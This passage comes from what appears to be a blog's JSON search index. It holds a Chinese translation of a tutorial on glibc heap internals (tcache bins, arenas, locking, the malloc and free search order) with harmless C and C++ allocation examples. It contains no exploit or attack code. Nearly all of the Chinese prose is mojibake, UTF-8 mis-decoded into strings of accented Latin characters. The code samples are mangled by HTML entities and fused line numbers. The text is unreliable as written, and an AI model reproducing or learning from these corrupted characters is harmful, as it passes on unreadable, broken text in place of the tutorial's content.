binå¯ä»¥å¤„ç†çš„mallocè¯·æ±‚ï¼ˆå³å¯¹äº32ä½ä¸­512å­—èŠ‚ä»¥ä¸Šçš„å—æˆ–64ä½ä¸­1024å­—èŠ‚ä»¥ä¸Šçš„å—ï¼‰æ—¶ï¼Œæˆ–è€…å½“ç¨‹åºè°ƒç”¨malloc_trimæˆ–malloptæ—¶ï¼Œéƒ½ä¼šå‘ç”Ÿâ€œåˆå¹¶â€é˜¶æ®µã€‚ TCACHE (PER-THREAD CACHE) BINSå †ç®¡ç†å™¨ç”¨æ¥åŠ å¿«åˆ†é…é€Ÿåº¦çš„æœ€ç»ˆä¼˜åŒ–æ˜¯æ¯ä¸ªçº¿ç¨‹è¿›è¡Œç¼“å­˜æˆ–â€œ tcacheâ€åˆ†é…å™¨ã€‚é¦–å…ˆè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹tcacheè¯•å›¾è§£å†³çš„é—®é¢˜ã€‚ å‡å¦‚ä¸€ä¸ªè®¡ç®—æœºç³»ç»Ÿä¸Šçš„æ¯ä¸ªè¿›ç¨‹éƒ½åŒæ—¶è¿è¡Œä¸€ä¸ªæˆ–å¤šä¸ªçº¿ç¨‹ã€‚å¤šçº¿ç¨‹å…è®¸ä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œå¤šä¸ªå¹¶å‘æ“ä½œã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªå¤§å®¹é‡çš„WebæœåŠ¡å™¨å¯èƒ½åŒæ—¶å…·æœ‰å¤šä¸ªä¼ å…¥è¯·æ±‚ï¼Œå¹¶ä¸”è¯¥WebæœåŠ¡å™¨å¯èƒ½è®©æ¯ä¸ªä¼ å…¥è¯·æ±‚éƒ½åœ¨è‡ªå·±çš„çº¿ç¨‹ä¸Šè¿›è¡ŒæœåŠ¡ï¼Œè€Œä¸æ˜¯è®©æ¯ä¸ªè¯·æ±‚éƒ½æ’æˆä¸€é˜Ÿç­‰å¾…æœåŠ¡ã€‚ ç»™å®šè¿›ç¨‹ä¸­çš„æ¯ä¸ªçº¿ç¨‹å…±äº«ç›¸åŒçš„åœ°å€ç©ºé—´ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯ä¸ªçº¿ç¨‹å¯ä»¥åœ¨å†…å­˜ä¸­çœ‹åˆ°ç›¸åŒçš„ä»£ç å’Œæ•°æ®ã€‚æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„å¯„å­˜å™¨å’Œå †æ ˆæ¥å­˜å‚¨ä¸´æ—¶å±€éƒ¨å˜é‡ï¼Œä½†æ˜¯è¯¸å¦‚å…¨å±€å˜é‡å’Œå †ä¹‹ç±»çš„èµ„æºåœ¨æ‰€æœ‰çº¿ç¨‹ä¹‹é—´å…±äº«ã€‚ åè°ƒè®¿é—®è¯¸å¦‚å †ä¹‹ç±»çš„å…¨å±€èµ„æºæ˜¯ä¸€ä¸ªå¤æ‚çš„è¯é¢˜ï¼Œå®ƒå‡ºé”™å¯èƒ½å¯¼è‡´ä¸€ä¸ªç§°ä¸ºâ€œrace conditionâ€çš„é—®é¢˜ï¼Œè¿™ä¼šå¯¼è‡´éš¾ä»¥è°ƒè¯•çš„å´©æºƒï¼Œé€šå¸¸ä¹Ÿå¯è¢«é»‘å®¢åˆ©ç”¨ã€‚ å‡è®¾åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸Šæä¾›æœåŠ¡çš„Webè¯·æ±‚å°è¯•æ›´æ–°æ•°æ®åº“æŸä¸€è¡Œï¼Œè€Œå¦ä¸€ä¸ªå¹¶å‘Webè¯·æ±‚å°è¯•ä»åŒä¸€è¡Œè¯»å–ã€‚é€šå¸¸ï¼Œæˆ‘ä»¬å°†è¦ç¡®ä¿ç¬¬äºŒä¸ªçº¿ç¨‹æ°¸è¿œä¸ä¼šçœ‹åˆ°ä¸­é—´å†™å…¥çš„å€¼ï¼Œä½†å› ä¸ºå®ƒæ­£è¢«å¦ä¸€ä¸ªçº¿ç¨‹è¦†ç›–ä½¿ç”¨ï¼Œä»è€Œç¬¬äºŒä¸ªçº¿ç¨‹å¯èƒ½çœ‹åˆ°éƒ¨åˆ†æˆ–æŸåå½¢å¼çš„è¡Œæ•°æ®ã€‚æ•°æ®åº“é€šè¿‡ä½¿è¯»å†™æ“ä½œçœ‹èµ·æ¥åƒåŸå­æ“ä½œæ¥è§£å†³æ­¤é—®é¢˜ï¼šå¦‚æœä¸¤ä¸ªçº¿ç¨‹è¯•å›¾åŒæ—¶è®¿é—®åŒä¸€è¡Œï¼Œåˆ™å¿…é¡»å…ˆå®Œæˆä¸€ä¸ªæ“ä½œï¼Œç„¶åæ‰èƒ½å¼€å§‹ä¸‹ä¸€ä¸ªæ“ä½œã€‚è§£å†³è¿™äº›ç«äº‰æ¡ä»¶çš„ä¸€ç§éå¸¸å¸¸è§çš„æ–¹æ³•æ˜¯é€šè¿‡ä½¿ç”¨é”ï¼Œä½¿å…¶ä»–åŒæ—¶è®¿é—®å…¨å±€èµ„æºçš„è¯·æ±‚å¼ºåˆ¶è¿›å…¥é¡ºåºé˜Ÿåˆ—ã€‚ é€šå¸¸ï¼Œé”æ˜¯é€šè¿‡ä¸€ä¸ªçº¿ç¨‹åœ¨å…¶ä½¿ç”¨ä¹‹å‰â€œæ ‡è®°â€å®ƒæ‹¥æœ‰å…¨å±€èµ„æºçš„æ‰€æœ‰æƒï¼Œç„¶åæ‰§è¡Œå…¶æ“ä½œï¼Œç„¶åæ ‡è®°è¯¥èµ„æºä¸å†ä½¿ç”¨æ¥è¿›è¡Œé”å®šçš„ã€‚å¦‚æœå‡ºç°å¦ä¸€ä¸ªçº¿ç¨‹å¹¶å¸Œæœ›ä½¿ç”¨è¯¥èµ„æºå¹¶çœ‹åˆ°å…¶ä»–çº¿ç¨‹æ­£åœ¨ä½¿ç”¨è¯¥èµ„æºï¼Œåˆ™è¯¥çº¿ç¨‹å°†ç­‰å¾…ï¼Œç›´åˆ°å¦ä¸€ä¸ªçº¿ç¨‹å®Œæˆã€‚è¿™æ ·å¯ä»¥ç¡®ä¿å…¨å±€èµ„æºä¸€æ¬¡ä»…ç”±ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨ã€‚ä½†è¿™å¸¦æ¥äº†æˆæœ¬ï¼šæ­£åœ¨ç­‰å¾…èµ„æºçš„çº¿ç¨‹åœæ»å¹¶æµªè´¹æ—¶é—´ã€‚è¿™ç§°ä¸ºâ€œlock contentionâ€ï¼ˆé”äº‰ç”¨ï¼‰ã€‚ å¯¹äºè®¸å¤šå…¨å±€å˜é‡ï¼Œè¿™ä¸ªå¼€é”€è¿˜å¯ä»¥æ¥å—ã€‚ä½†æ˜¯å¯¹äºæ‰€æœ‰çº¿ç¨‹éƒ½åœ¨ä¸æ–­ä½¿ç”¨çš„å †ï¼Œæ­¤å¼€é”€ä¼šå¾ˆå¿«å¯¼è‡´æ•´ä¸ªç¨‹åºçš„é€Ÿåº¦å˜æ…¢ã€‚ å †ç®¡ç†å™¨ä¸»è¦é€šè¿‡ä¸ºæ¯ä¸ªçº¿ç¨‹åˆ›å»ºè‡ªå·±çš„arenaè§£å†³è¿™ä¸ªé—®é¢˜ï¼Œç›´åˆ°è¾¾åˆ°arenaåˆ†é…æ•°ç›®çš„é˜ˆå€¼ã€‚æ­¤å¤–ï¼Œtcache ä¸­per-thread cacheçš„ç›®çš„æ˜¯å‡å°‘é”æœ¬èº«çš„æˆæœ¬ï¼Œå› ä¸ºé”æŒ‡ä»¤å¼€é”€å¾ˆå¤§ï¼Œå¹¶ä¸”æœ€ç»ˆä¼šå ç”¨â€fast-pathâ€œä¸­å¾ˆå¤§ä¸€éƒ¨åˆ†æ‰§è¡Œæ—¶é—´ã€‚æ­¤åŠŸèƒ½å·²æ·»åŠ åˆ°glibc 2.26ä¸­çš„mallocå†…å­˜åˆ†é…åŠŸèƒ½ä¸­ï¼Œå¹¶ä¸”é»˜è®¤æƒ…å†µä¸‹å¯ç”¨ã€‚ Per-thread cachingé€šè¿‡å‡†å¤‡å¥½å°å—çš„per-thread binsæ¥åŠ å¿«åˆ†é…é€Ÿåº¦ã€‚è¿™æ ·ï¼Œå½“çº¿ç¨‹è¯·æ±‚ä¸€ä¸ªå—æ—¶ï¼Œå¦‚æœè¯¥çº¿ç¨‹åœ¨å…¶tcacheä¸Šæœ‰ä¸€ä¸ªå—å¯ç”¨ï¼Œåˆ™å®ƒå¯ä»¥ä¸ºåˆ†é…æä¾›æœåŠ¡ï¼Œè€Œä¸å¿…ç­‰å¾…å †é”ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰64ä¸ªå•é“¾æ¥çš„tcache binsã€‚æ¯ä¸ªbinæœ€å¤šåŒ…å«7ä¸ªç›¸åŒå¤§å°çš„å—ï¼Œåœ¨64ä½ç³»ç»Ÿä¸Šä¸º24åˆ°1032å­—èŠ‚ï¼Œåœ¨32ä½ç³»ç»Ÿä¸Šä¸º12åˆ°516å­—èŠ‚ã€‚ HOW DO CHUNKS END UP IN TCACHE BINS?ä¸€ä¸ªå—è¢«é‡Šæ”¾åï¼Œå †ç®¡ç†å™¨å°†æŸ¥çœ‹è¯¥å—æ˜¯å¦å­˜åœ¨ä¸è¯¥å—å¤§å°ç›¸å¯¹åº”çš„tcacheå®¹å™¨ã€‚ä¸fast binä¸€æ ·ï¼Œtcache bin ä¸Šçš„å—è¢«è§†ä¸ºâ€œæ­£åœ¨ä½¿ç”¨â€ï¼Œå¹¶ä¸”ä¸ä¼šä¸ç›¸é‚»é‡Šæ”¾çš„å—åˆå¹¶ã€‚ å¦‚æœåŒ¹é…è¯¥å—å¤§å°çš„tcacheå·²æ»¡ï¼ˆæˆ–è€…è¯¥å—å¯¹äºtcache binè€Œè¨€å¤ªå¤§ï¼‰ï¼Œåˆ™å †ç®¡ç†å™¨å°†æ¢å¤åˆ°æˆ‘ä»¬ä»¥å‰çš„â€slow-pathâ€œç­–ç•¥ï¼Œå³è·å–å †é”ï¼Œç„¶ååƒä»¥å‰ä¸€æ ·å¤„ç†è¯¥å—ã€‚ ç›¸åº”çš„tcacheåˆ†é…ç­–ç•¥ä¹Ÿéå¸¸ç®€å•ã€‚å¦‚æœåœ¨åŒ¹é…çš„tcache binä¸Šæœ‰å—å¯ç”¨ï¼Œåˆ™ç»™å®šä¸€ä¸ªå—è¯·æ±‚ï¼Œå †å°†è¿”å›è¯¥å—ï¼Œè€Œä¸ä¼šè·å¾—å †é”ã€‚å¦‚æœå—å¯¹äºtcacheæ¥è¯´å¤ªå¤§ï¼Œç»§ç»­é‡‡ç”¨â€slow-pathâ€œç­–ç•¥ã€‚ åœ¨æˆ‘ä»¬å°è¯•è¿›è¡Œåˆ†é…çš„æƒ…å†µä¸‹ï¼Œæœ‰ä¸€ä¸ªå¯¹åº”çš„tcache binï¼Œä½†å¦‚æœè¿™ä¸ªbinå·²æ»¡ï¼Œæˆ‘ä»¬è¿›è¡Œäº†ç¨å¾®ä¿®æ”¹çš„åˆ†é…ç­–ç•¥ã€‚æˆ‘ä»¬ä¸åªæ˜¯è·å–å †é”å¹¶æŸ¥æ‰¾å•ä¸ªå—ï¼Œè¿˜è·å–äº†å †é”ï¼Œå¹¶è¶æœºå°†å°½å¯èƒ½å¤šçš„è¿™ç§å¤§å°çš„å—æå‡åˆ°tcacheï¼Œï¼ˆæ—¶é—´å±€éƒ¨æ€§å’Œç©ºé—´å±€éƒ¨æ€§ï¼‰åŒæ—¶æˆ‘ä»¬ä»ç„¶ä¿æŒå †é”ï¼Œç›´åˆ°tcache biné™åˆ¶ä¸ºä¸ƒä¸ªï¼Œå¹¶ä¸”å°†æœ€ååŒ¹é…çš„å—è¿”å›ç»™ç”¨æˆ·ã€‚ PUTTING IT ALL TOGETHERä¸‹é¢è®©æˆ‘ä»¬æ•´ä½“å›é¡¾ä¸€ä¸‹ï¼Œglibcä¸­æ•´ä¸ªmallocã€freeçš„å®ç°çš„ç®—æ³•ã€‚ é¦–å…ˆï¼Œæ¯ä¸ªåˆ†é…çš„å†…å­˜å—æ˜¯å¯¹é½çš„ï¼Œå¹¶åŒ…å«å…ƒæ•°æ®ä»¥åŠç”¨æˆ·åŒºåŸŸã€‚å½“ç¨‹åºå‘˜ä»å †ä¸­è¯·æ±‚å†…å­˜æ—¶ï¼Œå †ç®¡ç†å™¨é¦–å…ˆè®¡ç®—å‡ºåˆ†é…è¯·æ±‚å¯¹åº”çš„å—å¤§å°ï¼Œç„¶åæŒ‰ä»¥ä¸‹é¡ºåºæœç´¢å†…å­˜ï¼ˆè¿™é‡Œç›´æ¥è€ƒè™‘å¤šçº¿ç¨‹ï¼‰ï¼š å¦‚æœè¯·æ±‚çš„å—å¤§å°ä¸tcache binç›¸åŒ¹é…ï¼Œå¹¶ä¸”tcache binä¸­æœ‰å¯ç”¨çš„å—ï¼Œåˆ™ç«‹å³åˆ†é…è¿”å›ã€‚ å¦‚æœè¯·æ±‚çš„å—å¾ˆå¤§ï¼Œåˆ™é€šè¿‡mmapåˆ†é…å †å¤–èµ„æº å¦åˆ™ï¼Œæˆ‘ä»¬å°†è·å¾—arena heap lockï¼Œå¹¶ä¸”æŒ‰ç…§ä»¥ä¸‹ç­–ç•¥é¡ºåºæ‰§è¡Œï¼š â€‹ Aã€å°è¯•fast bin / small binå›æ”¶ç­–ç•¥ å¦‚æœå­˜åœ¨ç›¸åº”çš„fast binï¼Œå°è¯•æ‰¾åˆ°ä¸€ä¸ªå—åŒ¹é…ï¼ˆåŒæ—¶ç”¨fast binsä¸­çš„æ¡ç›®ï¼ˆå¦‚æœå­˜åœ¨åŒ¹é…ï¼‰é¢„å¡«å……tcacheï¼‰ å¦åˆ™ï¼Œå¦‚æœå­˜åœ¨å¯¹åº”çš„small binï¼Œå°è¯•æ‰¾åˆ°ä¸€ä¸ªå—åŒ¹é…ï¼ˆåŒæ—¶é¢„å¡«å……tcacheï¼‰ â€‹ Bã€è§£å†³æ‰€æœ‰å»¶æœŸé‡Šæ”¾å— å¦åˆ™ï¼Œfast binä¸­çš„æ¡ç›®å°†è¢«çœŸæ­£é‡Šæ”¾ï¼Œå¹¶ä¸”å°†å…¶åˆå¹¶åˆ°unsorted binä¸­ã€‚ éå†unsorted binä¸­çš„æ‰€æœ‰æ¡ç›®ã€‚å¦‚æœåŒ¹é…ï¼Œåˆ™åœæ­¢ã€‚å¦åˆ™ï¼Œåœ¨æ“ä½œæ—¶å°†unsortedä¸­çš„æ¡ç›®æ”¾åœ¨å…¶ç›¸åº”çš„small/large binä¸­ï¼ˆåŒæ—¶å°½å¯èƒ½æå‡small binä¸­çš„æ¡ç›®åˆ°tcache binï¼‰ â€‹ Cã€é»˜è®¤å›åˆ°åŸºæœ¬å›æ”¶ç­–ç•¥ å¦‚æœå—å¤§å°ä¸ä¸€ä¸ªlarge binç›¸åŒ¹é…ï¼Œåˆ™ç«‹å³æœç´¢ç›¸åº”çš„large bin â€‹ Dã€ä»å¤´åˆ›å»ºä¸€ä¸ªæ–°çš„å— å¦åˆ™ï¼Œå°†æ²¡æœ‰å¯ç”¨çš„å—ï¼Œæ‰€ä»¥å°è¯•ä»å †é¡¶éƒ¨è·å–ä¸€ä¸ªå— å¦‚æœå †çš„é¡¶éƒ¨ç©ºé—´ä¸è¶³ï¼Œå°è¯•ä½¿ç”¨sbrkå¯¹å…¶è¿›è¡Œæ‰©å±• å¦‚æœé‡åˆ°äº†åœ°å€ç©ºé—´çš„å…¶ä»–é—®é¢˜ï¼Œå¯¼è‡´å †ä¸å¯ä»¥æ‰©å±•ï¼Œåˆ™ä½¿ç”¨mmapåˆ›å»ºä¸€ä¸ªä¸è¿ç»­çš„æ‰©å±•å¹¶ä»é‚£é‡Œè¿›è¡Œåˆ†é…ã€‚ â€‹ Eã€å¦‚æœæ‰€æœ‰æ–¹æ³•å‡å¤±è´¥ï¼Œåˆ™è¿”å›NULL ã€‚ ä»¥åŠç›¸åº”çš„freeç­–ç•¥ï¼š å¦‚æœæŒ‡é’ˆä¸ºNULLï¼Œåˆ™Cæ ‡å‡†å°†è¯¥è¡Œä¸ºå®šä¹‰ä¸ºâ€œä¸æ‰§è¡Œä»»ä½•æ“ä½œâ€ã€‚ å¦åˆ™ï¼Œé€šè¿‡å‡å»å—å…ƒæ•°æ®çš„å¤§å°ï¼Œå°†æŒ‡é’ˆæŒ‡å›ã€‚ å¯¹å—æ‰§è¡Œä¸€äº›å®Œæ•´æ€§æ£€æŸ¥ï¼Œå¦‚æœå®Œæ•´æ€§æ£€æŸ¥å¤±è´¥ï¼Œåˆ™ä¸­æ­¢ã€‚ å¦‚æœè¯¥å—é€‚åˆæ”¾å…¥tcache binï¼Œåˆ™å°†å…¶å­˜å‚¨åœ¨å…¶ä¸­ã€‚ å¦‚æœè¯¥å—è®¾ç½®äº†Mä½ï¼Œåˆ™é€šè¿‡munmapå°†å…¶è¿”å›ç»™æ“ä½œç³»ç»Ÿã€‚ å¦åˆ™ï¼Œæˆ‘ä»¬å°†è·å¾—arenaå †é”ï¼Œç„¶åï¼š å¦‚æœè¯¥å—é€‚åˆä¸€ä¸ªfastbinï¼Œå°†å…¶æ”¾åœ¨ç›¸åº”çš„fastbinä¸Šï¼Œç»“æŸã€‚ å¦‚æœå—å¤§äº64KBï¼Œç«‹å³åˆå¹¶fastbinï¼Œç„¶åå°†åˆå¹¶çš„å—æ”¾å…¥unsorted binä¸­ã€‚ å°†æ•°æ®å—ä¸ç›¸é‚»çš„é‡Šæ”¾çš„æ•°æ®å—åœ¨small binã€large binã€unsorted binä¸­å‰ååˆå¹¶ã€‚ å¦‚æœç”Ÿæˆçš„å—ä½äºå †çš„é¡¶éƒ¨ï¼Œåˆ™å°†å…¶åˆå¹¶åˆ°å †çš„é¡¶éƒ¨ï¼Œè€Œä¸æ˜¯å°†å…¶å­˜å‚¨åœ¨binä¸­ã€‚ å¦åˆ™å°†å…¶å­˜å‚¨åœ¨unsorted binä¸­ã€‚ï¼ˆMallocç¨åä¼šåšå·¥ä½œï¼Œå°†unsorted binä¸­çš„æ¡ç›®æ”¾å…¥small binæˆ–è€…large binä¸­ã€‚ï¼‰","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Heap","slug":"PWN/Heap","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/"},{"name":"Heap_Basic","slug":"PWN/Heap/Heap-Basic","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/Heap-Basic/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"Heap I","slug":"Heap/Heap-I","date":"2020-10-16T14:10:00.000Z","updated":"2020-10-19T07:10:26.000Z","comments":true,"path":"2020/10/16/Heap/Heap-I/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/16/Heap/Heap-I/","excerpt":"","text":"åŸç‰ˆä¼ é€é—¨ WHAT IS THE HEAP, AND WHY DO PEOPLE USE IT?å †æ˜¯C/C++ç¨‹åºå‘˜åœ¨ç¨‹åºæ‰§è¡ŒæœŸé—´æ‰‹åŠ¨åˆ†é…çš„æ–°çš„åŒºåŸŸã€‚ç¨‹åºå‘˜é€šè¿‡è°ƒç”¨å †ç›¸å…³çš„å‡½æ•°å¦‚mallocå‘å †ç®¡ç†å™¨è¯·æ±‚è¿™éƒ¨åˆ†åŒºåŸŸã€‚è¿™äº›è¢«åˆ†é…çš„å†…å­˜åŒºåŸŸï¼Œæˆ–è€…ç§°ä¸ºâ€œallocationsâ€ï¼Œä¹‹åå¯ä»¥è¢«ç¨‹åºå‘˜ä¸€ç›´ä½¿ç”¨ã€ä¿®æ”¹æˆ–è€…å¼•ç”¨ï¼Œç›´åˆ°ä»–ä»¬ä¸å†éœ€è¦è¿™éƒ¨åˆ†åŒºåŸŸï¼Œä¼šè°ƒç”¨freeå‡½æ•°å°†è¿™éƒ¨åˆ†åŒºåŸŸè¿”è¿˜ç»™å †ç®¡ç†å™¨ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªCè¯­è¨€ç¨‹åºåˆ†é…ã€ä½¿ç”¨å¹¶ä¸”é‡Šæ”¾å †ä¸Šçš„ç»“æ„ä½“çš„ä¾‹å­ï¼š 123456789101112131415161718typedef struct &#123; int field1; char* field2;&#125; SomeStruct;int main()&#123; SomeStruct* myObject = (SomeStruct*)malloc(sizeof(SomeStruct)); if(myObject != NULL) &#123; myObject-&gt;field1 = 1234; myObject-&gt;field2 = â€œHello World!â€; do_stuff(myObject); free(myObject); &#125; return 0;&#125; æ‰€ä»¥åªè¦ç¨‹åºå‘˜éµå¾ªä¸‹é¢å‡ ä¸ªå°çš„è§„åˆ™ï¼Œå †ç®¡ç†å™¨å°†ç¡®ä¿æ¯ä¸ªå·²åˆ†é…çš„å †ä¸ä¼šç›¸äº’é‡å ã€‚è¿™ä¸ªç‰¹ç‚¹ä½¿å¾—å †éå¸¸æœ‰ç”¨å¹¶ä¸”é«˜æ•ˆï¼Œè¿™å’Œå¤§å¤šæ•°C/C++ç¨‹åºè¿½æ±‚æ€§èƒ½çš„è¦æ±‚ç›¸ç¬¦åˆã€‚ æ¥ä¸‹æ¥çš„å›¾è¡¨åˆ—å‡ºäº†ä¸€äº›ç¨‹åºå‘˜åœ¨ä½¿ç”¨å †æ—¶çš„åŸºæœ¬è§„åˆ™ï¼Œä»¥åŠåœ¨ç¨‹åºå‘˜è¿åè¿™äº›è§„åˆ™æ—¶å‘ç”Ÿçš„ä¸€äº›æ¼æ´ç±»åˆ«ã€‚ä¹‹åï¼Œæˆ‘å°†æ›´è¯¦ç»†åœ°è®¨è®ºæ‰€æœ‰è¿™äº›ä¸å †ç›¸å…³çš„æ¼æ´ç±»åˆ«ï¼Œç›®å‰åªè®¨è®ºå †ä½¿ç”¨æ­£ç¡®æ—¶çš„è¡¨ç°ã€‚ HEAP RULES å½“ç„¶ï¼Œmallocå’Œfreeå¹¶ä¸æ˜¯Cå’ŒC++ç¨‹åºå‘˜ä¸å †è¿›è¡Œäº¤äº’çš„å”¯ä¸€æ–¹å¼ã€‚ç›¸åï¼ŒC++å¼€å‘äººå‘˜é€šå¸¸é€šè¿‡C++è¿ç®—ç¬¦newå’Œnew []åˆ†é…å†…å­˜ã€‚å¿…é¡»ä½¿ç”¨ç›¸åº”çš„C++è¿ç®—ç¬¦deleteå’Œdelete []è€Œä¸æ˜¯freeé‡Šæ”¾è¿™äº›åˆ†é…ã€‚ç¨‹åºå‘˜è¿˜å¯ä»¥é€šè¿‡ä¸mallocå…¼å®¹çš„å †å‡½æ•°ï¼ˆä¾‹å¦‚callocï¼Œreallocå’Œmemalignï¼‰æ¥åˆ†é…å†…å­˜ï¼Œè¿™äº›å‡½æ•°æœ€ç»ˆä¹Ÿé€šè¿‡freeé‡Šæ”¾ï¼Œå°±åƒmallocä¸€æ ·ã€‚ ä¸ºç®€å•èµ·è§ï¼Œå°†é¦–å…ˆè®¨è®ºmallocå’Œfreeï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªC++ç¨‹åºå¦‚ä½•åˆ†é…ï¼Œä½¿ç”¨å’Œé‡Šæ”¾å †ä¸Šçš„ç»“æ„ä½“çš„ä¾‹å­ï¼š 12345678910111213141516class SomeClass&#123;public: int field1; char* field2;&#125;;int main()&#123; SomeClass* myObject = new SomeClass(); myObject-&gt;field1 = 1234; myObject-&gt;field2 = â€œHello World!â€; do_stuff(myObject); delete myObject; return 0;&#125; MEMORY CHUNKS AND THE CHUNK ALLOCATION STRATEGIESå‡è®¾ä¸€ä¸ªç¨‹åºå‘˜é€šè¿‡mallocéœ€æ±‚10å­—èŠ‚å†…å­˜ï¼Œä¸ºäº†æ»¡è¶³è¿™ä¸ªè¯·æ±‚ï¼Œå †ç®¡ç†å™¨ä¸ä»…ä»…åªéšæœºå¯»æ‰¾ä¸€ä¸ª10å­—èŠ‚çš„ç¨‹åºå‘˜å¯ä»¥å†™çš„åŒºåŸŸï¼Œè€Œæ˜¯éœ€è¦åšæ›´å¤šçš„äº‹æƒ…ã€‚å †ç®¡ç†å™¨ä¹Ÿéœ€è¦å­˜å‚¨æ­¤æ¬¡åˆ†é…çš„å…ƒæ•°æ®ã€‚è¿™ä¸ªå…ƒæ•°æ®è¢«å­˜å‚¨åœ¨ç´§é‚»åˆ†é…çš„10å­—èŠ‚åŒºåŸŸå¤„ã€‚ å †ç®¡ç†å™¨è¿˜éœ€è¦ç¡®ä¿åˆ†é…ç©ºé—´åœ¨32ä½ç³»ç»Ÿä¸Šæ˜¯8å­—èŠ‚å¯¹é½çš„ï¼Œåœ¨64ä½ç³»ç»Ÿä¸Šæ˜¯16å­—èŠ‚å¯¹é½çš„ã€‚å¦‚æœç¨‹åºå‘˜åªæƒ³å­˜å‚¨æ–‡æœ¬å­—ç¬¦ä¸²æˆ–å­—èŠ‚æ•°ç»„ä¹‹ç±»çš„æ•°æ®ï¼Œé‚£ä¹ˆåˆ†é…ç©ºé—´çš„å¯¹é½æ–¹å¼æ— å…³ç´§è¦ã€‚ä½†æ˜¯å¦‚æœç¨‹åºå‘˜æ‰“ç®—ä½¿ç”¨åˆ†é…ç©ºé—´æ¥å­˜å‚¨æ›´å¤šå¤æ‚çš„æ•°æ®ç»“æ„ï¼Œåˆ™å¯¹é½æ–¹å¼ä¼šå¯¹ç¨‹åºçš„æ­£ç¡®æ€§å’Œæ€§èƒ½ä¼šäº§ç”Ÿé‡å¤§å½±å“ã€‚ç”±äºmallocæ— æ³•çŸ¥é“ç¨‹åºå‘˜å°†åœ¨åˆ†é…ç©ºé—´ä¸­å­˜å‚¨ä»€ä¹ˆå†…å®¹ï¼Œå› æ­¤å †ç®¡ç†å™¨å¿…é¡»é»˜è®¤ç¡®ä¿æ‰€æœ‰åˆ†é…ç©ºé—´å‡å¯¹é½ã€‚ æ­¤åˆ†é…å…ƒæ•°æ®å’Œå¯¹é½å¡«å……å­—èŠ‚ä¸mallocçš„å†…å­˜åŒºåŸŸå°†ä¸€èµ·è¢«å­˜å‚¨å¹¶è¿”å›ç»™ç¨‹åºå‘˜ã€‚å› æ­¤ï¼Œå †ç®¡ç†å™¨åœ¨å†…éƒ¨åˆ†é…çš„â€œå—â€å†…å­˜æ¯”ç¨‹åºå‘˜æœ€åˆè¦æ±‚çš„ç¨å¤§ã€‚å½“ç¨‹åºå‘˜è¦æ±‚10ä¸ªå­—èŠ‚çš„å†…å­˜æ—¶ï¼Œå †ç®¡ç†å™¨ä¼šæ‰¾åˆ°æˆ–åˆ›å»ºä¸€ä¸ªæ–°çš„å†…å­˜å—ï¼Œè¯¥å—è¶³ä»¥å­˜å‚¨10ä¸ªå­—èŠ‚çš„ç©ºé—´ã€å…ƒæ•°æ®ä»¥åŠå¯¹é½å¡«å……å­—èŠ‚ã€‚ç„¶åï¼Œå †ç®¡ç†å™¨å°†æ­¤å—æ ‡è®°ä¸ºâ€œå·²åˆ†é…â€ï¼Œå¹¶è¿”å›æŒ‡å‘å—å†…å¯¹é½çš„10å­—èŠ‚â€œç”¨æˆ·æ•°æ®â€åŒºåŸŸçš„æŒ‡é’ˆï¼Œç¨‹åºå‘˜å°†æ”¶åˆ°mallocè°ƒç”¨çš„è¿”å›å€¼ã€‚ CHUNK ALLOCATION: BASIC STRATEGYé‚£ä¹ˆå †ç®¡ç†å™¨å¦‚ä½•åœ¨å†…éƒ¨åˆ†é…è¿™äº›å—å‘¢ï¼Ÿ é¦–å…ˆï¼Œè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹å †ç®¡ç†å™¨çš„å¤§éƒ¨åˆ†å·¥ä½œï¼Œåˆ†é…å°å—å†…å­˜çš„ï¼ˆå¤§å¤§ç®€åŒ–çš„ï¼‰ç­–ç•¥ã€‚æˆ‘å°†åœ¨è¯¦ç»†åœ°è§£é‡Šæ¯ä¸ªæ­¥éª¤ï¼Œä¹‹åæˆ‘ä»¬å°±å¯ä»¥ç ”ç©¶åˆ†é…å¤§å—å†…å­˜çš„ç‰¹æ®Šæƒ…å†µã€‚ ç®€åŒ–çš„å°å—åˆ†é…ç­–ç•¥å¦‚ä¸‹ï¼š å¦‚æœæœ‰ä¸€ä¸ªå…ˆå‰é‡Šæ”¾çš„å†…å­˜å—ï¼Œå¹¶ä¸”è¯¥å—è¶³å¤Ÿå¤§ï¼Œå¯ä»¥æ»¡è¶³ç”¨æˆ·çš„è¯·æ±‚ï¼Œåˆ™å †ç®¡ç†å™¨å°†ä½¿ç”¨è¿™ä¸ªé‡Šæ”¾çš„å—è¿›è¡Œæ–°çš„åˆ†é…ã€‚ å¦åˆ™ï¼Œå¦‚æœå †é¡¶éƒ¨æœ‰å¯ç”¨ç©ºé—´ï¼Œåˆ™å †ç®¡ç†å™¨å°†ä»è¿™ä¸ªç©ºé—²çš„ç©ºé—´ä¸­åˆ†é…ä¸€ä¸ªæ–°çš„å—å¹¶ä½¿ç”¨å®ƒã€‚ å¦åˆ™ï¼Œå †ç®¡ç†å™¨å°†è¦æ±‚å†…æ ¸å‘å †çš„æœ«å°¾æ·»åŠ æ–°çš„å†…å­˜ï¼Œå¹¶ä¸”ä»æ–°åˆ†é…çš„ç©ºé—´ä¸­åˆ†é…ä¸€ä¸ªæ–°å—ç»™ç”¨æˆ·ã€‚ å¦‚æœå‰é¢æ‰€æœ‰ç­–ç•¥å‡å¤±è´¥ï¼Œåˆ™æ— æ³•ä¸ºæä¾›åˆ†é…æœåŠ¡ï¼Œå¹¶ä¸”mallocè¿”å›NULLã€‚ ALLOCATING FROM 